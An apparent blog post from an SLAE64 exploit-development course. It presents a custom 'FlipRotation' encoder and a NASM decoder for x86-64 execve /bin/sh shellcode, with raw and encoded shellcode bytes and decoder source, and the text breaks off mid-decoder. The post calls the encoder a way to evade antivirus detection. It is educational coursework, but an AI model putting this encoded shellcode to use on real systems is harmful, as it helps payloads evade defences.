<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) | nibbles</title>
<meta name="keywords" content="slae64">
<meta name="description" content="This post introduces my 4th mission to my SLAE64 journey.
Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).
There is a lof of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder).">
<meta name="author" content="nibbles">
<link rel="canonical" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)" />
<meta property="og:description" content="This post introduces my 4th mission to my SLAE64 journey.
Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).
There is a lof of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-01T17:27:17+00:00" />
<meta property="article:modified_time" content="2023-01-01T17:27:17+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"/>
<meta name="twitter:description" content="This post introduces my 4th mission to my SLAE64 journey.
Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).
There is a lof of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://0xnibbles.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)",
      "item": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)",
  "name": "SLAE64 Assignment 4 - Custom Encoder\/Decoder Shellcode (FlipRotation Encoder\/Decoder)",
  "description": "This post introduces my 4th mission to my SLAE64 journey.\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).\nThere is a lof of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder).",
  "keywords": [
    "slae64"
  ],
  "articleBody": " This post introduces my 4th mission to my SLAE64 journey.\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).\nThere is a lof of overlap information with my post regarding the SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder). I advice you to take look at if haven’t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.\nFlipRotation Algorithm Overview The algorithm logic is the same as the one described in the FlipRotation Algorithm. My approach here was to port the 32 to 64 bit version so, I won’t go into details in this post.\nEncoder Similar to the 32 bit version but converted to output 64 bit assembly. Please see FlipRotation Encoder for more details.\nEncoder Output ╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› ╰─$ python3 flipRotation_Encoder.py _______________________________________________________________ ",
  "wordCount" : "749",
  "inLanguage": "en",
  "datePublished": "2023-01-01T17:27:17Z",
  "dateModified": "2023-01-01T17:27:17Z",
  "author":{
    "@type": "Person",
    "name": "nibbles"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_4/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nibbles",
    "logo": {
      "@type": "ImageObject",
      "url": "https://0xnibbles.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://0xnibbles.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/about.html" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      SLAE64 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)
    </h1>
    <div class="post-meta"><span title='2023-01-01 17:27:17 +0000 UTC'>January 1, 2023</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;nibbles

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
                <li>
                    <a href="#fliprotation-algorithm-overview" aria-label="FlipRotation Algorithm Overview">FlipRotation Algorithm Overview</a><ul>
                        
                <li>
                    <a href="#encoder" aria-label="Encoder">Encoder</a><ul>
                        <ul>
                        
                <li>
                    <a href="#encoder-output" aria-label="Encoder Output">Encoder Output</a></li></ul>
                    </ul>
                </li>
                <li>
                    <a href="#decoder" aria-label="Decoder">Decoder</a><ul>
                        <ul>
                        <ul>
                        
                <li>
                    <a href="#decoder-1" aria-label="Decoder">Decoder</a></li></ul>
                    </ul>
                    </ul>
                </li>
                <li>
                    <a href="#compiling-and-testing-the-fliprotation-decoder" aria-label="Compiling and Testing the FlipRotation Decoder">Compiling and Testing the FlipRotation Decoder</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/slae64/slae64.png#center" alt="SLAE64"  title="SLAE64"  />
</p>
<p>This post introduces my 4th mission to my SLAE64 journey.</p>
<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>The forth assignment goal was to create my own custom encoder and decoder of the <code>execve stack shellcode</code>. AS ou may know, the purpose is to execute <code>/bin/sh</code>
 
A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).</p>
<p>There is a lof of overlap information with my post regarding the <a href="/posts/slae32/slae_32_assignment_4/">SLAE32 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)</a>. I advice you to take look at if haven&rsquo;t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.</p>
<h2 id="fliprotation-algorithm-overview">FlipRotation Algorithm Overview<a hidden class="anchor" aria-hidden="true" href="#fliprotation-algorithm-overview">#</a></h2>
<p>The algorithm logic is the same as the one described in the <a href="/posts/slae32/slae_32_assignment_4/#fliprotation-algorithm-overview">FlipRotation Algorithm</a>. My approach here was to port the 32 to 64 bit version so, I won&rsquo;t go into details in this post.</p>
<h3 id="encoder">Encoder<a hidden class="anchor" aria-hidden="true" href="#encoder">#</a></h3>
<p>Similar to the 32 bit version but converted to output 64 bit assembly. Please see <a href="/posts/slae32/slae_32_assignment_4/#encoder">FlipRotation Encoder</a> for more details.</p>
<h5 id="encoder-output">Encoder Output<a hidden class="anchor" aria-hidden="true" href="#encoder-output">#</a></h5>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/4-Insertion-Encoder-Shellcode ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ python3 flipRotation_Encoder.py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        _______________________________________________________________
</span></span><span style="display:flex;"><span>         &lt;The <span style="color:#e6db74">&#34;FlipRotation&#34;</span> Encoder - Bit flip and rotate your shellcode
</span></span><span style="display:flex;"><span>        ---------------------------------------------------------------
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">\ </span>  ^__^
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">\ </span>  <span style="color:#f92672">(</span>oo<span style="color:#f92672">)</span><span style="color:#ae81ff">\_</span>______
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">(</span>__<span style="color:#f92672">)</span><span style="color:#ae81ff">\ </span>      <span style="color:#f92672">)</span><span style="color:#ae81ff">\/\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                    <span style="color:#f92672">||</span>----w |
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">||</span>     <span style="color:#f92672">||</span>       
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>         
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shellcode length: <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shellcode: b<span style="color:#e6db74">&#39;H1\xc0PH\xbb/bin//shSH\x89\xe7PH\x89\xe2WH\x89\xe6H\x83\xc0;\x0f\x05&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Key Provided by the user. Doing magic with it
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Key: 0xa0
</span></span><span style="display:flex;"><span>After rotation: 0x49
</span></span><span style="display:flex;"><span>After rotation: 0x7
</span></span><span style="display:flex;"><span>After rotation: 0x8a
</span></span><span style="display:flex;"><span>After rotation: 0x94
</span></span><span style="display:flex;"><span>After rotation: 0xb1
</span></span><span style="display:flex;"><span>After rotation: 0xde
</span></span><span style="display:flex;"><span>After rotation: 0x2d
</span></span><span style="display:flex;"><span>After rotation: 0xa4
</span></span><span style="display:flex;"><span>After rotation: 0x45
</span></span><span style="display:flex;"><span>After rotation: 0x4a
</span></span><span style="display:flex;"><span>After rotation: 0x7c
</span></span><span style="display:flex;"><span>After rotation: 0xa4
</span></span><span style="display:flex;"><span>After rotation: 0xcf
</span></span><span style="display:flex;"><span>After rotation: 0x25
</span></span><span style="display:flex;"><span>After rotation: 0x1c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#ae81ff">\x</span> format: 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>7<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>ff<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>8<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 0x format: 
</span></span><span style="display:flex;"><span>0x49,0xff,0x18,0x02,0x7,0xff,0x8a,0xff,0x94,0xff,0xd5,0x02,0xb8,0x02,0xb1,0xff,0x68,0x02,0xde,0xff,0x8b,0x02,0xc5,0x02,0x27,0x02,0x2d,0xff,0x49,0x02,0xa4,0xff,0x88,0x02,0x73,0x02,0x45,0xff,0x4a,0xff,0x88,0x02,0x7c,0xff,0x59,0x02,0xa4,0xff,0x88,0x02,0xcf,0xff,0x25,0xff,0x50,0x02,0x1c,0xff,0xd1,0x02,0x38,0x02,0x8,0x02,0xa0,0xa0
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
</span></span><span style="display:flex;"><span>--------------------
</span></span></code></pre></div><blockquote>
<p>Encoder script available at <a href="https://github.com/0xnibbles/slae_x86_64/blob/main/assignments/4-Insertion-Encoder-Shellcode/flipRotation_Encoder.py">https://github.com/0xnibbles/slae_x86_64/blob/main/assignments/4-Insertion-Encoder-Shellcode/flipRotation_Encoder.py</a></p>
</blockquote>
<h3 id="decoder">Decoder<a hidden class="anchor" aria-hidden="true" href="#decoder">#</a></h3>
<p>Similar to the 32 bit version but converted to output 64 bit assembly. Please see <a href="/posts/slae32/slae_32_assignment_4/#encoder">FlipRotation Encoder</a> for more details.</p>
<h6 id="decoder-1">Decoder<a hidden class="anchor" aria-hidden="true" href="#decoder-1">#</a></h6>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">;Author: Eduardo
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;Filename: flipRotation_decoder.nasm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span> <span style="color:#66d9ef">.text</span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">decoder</span>
</span></span><span style="display:flex;"><span>	EncodedShellcode: <span style="color:#a6e22e">db</span> <span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x18</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x7</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x8a</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x94</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd5</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xb8</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xb1</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x68</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xde</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x8b</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xc5</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x27</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x2d</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x49</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x73</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x45</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x4a</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x7c</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x59</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xa4</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x88</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xcf</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x25</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x1c</span>,<span style="color:#ae81ff">0xff</span>,<span style="color:#ae81ff">0xd1</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x38</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x8</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0xa0</span>,<span style="color:#ae81ff">0xa0</span> <span style="color:#75715e">; 0xa0 is the stop marker
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>decoder:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rel</span> <span style="color:#66d9ef">EncodedShellcode</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, [<span style="color:#66d9ef">rsi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">1</span>]	<span style="color:#75715e">; pointing to second byte (0x02) from shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">rax</span>					<span style="color:#75715e">; zeroes edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>,	<span style="color:#ae81ff">1</span> 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">rbx</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decode:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">rax</span>]	<span style="color:#75715e">; mov parity byte to bl
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0xa0</span>				<span style="color:#75715e">; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">jz</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">EncodedShellcode</span>	<span style="color:#75715e">; reached the marker if Zero Flag not set
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x5f</span>	<span style="color:#75715e">; if equal parity is even (0xff)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">rdx</span>] 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">jnz</span> <span style="color:#66d9ef">odd</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>even:	<span style="color:#75715e">; rotate right
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ror</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">bitFlip</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>odd: 	<span style="color:#75715e">; rotate left
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">rol</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">cl</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bitFlip:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">bl</span>, <span style="color:#ae81ff">0x01</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>restore_next_byte:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">rdx</span>], <span style="color:#66d9ef">bl</span>	<span style="color:#75715e">; replaces the original byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">bl</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsi</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">rax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">1</span>]  <span style="color:#75715e">; mov encoded byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rdi</span>], <span style="color:#66d9ef">bl</span>          <span style="color:#75715e">; change last used parity byte for the next encoded byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rdi</span>                     <span style="color:#75715e">; rdi points to position of the next parity byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">2</span>                   <span style="color:#75715e">; offset added to next parity byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">dl</span>                      <span style="color:#75715e">; offset to the next encoded byte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">cl</span>                      <span style="color:#75715e">; loop index value incremented
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
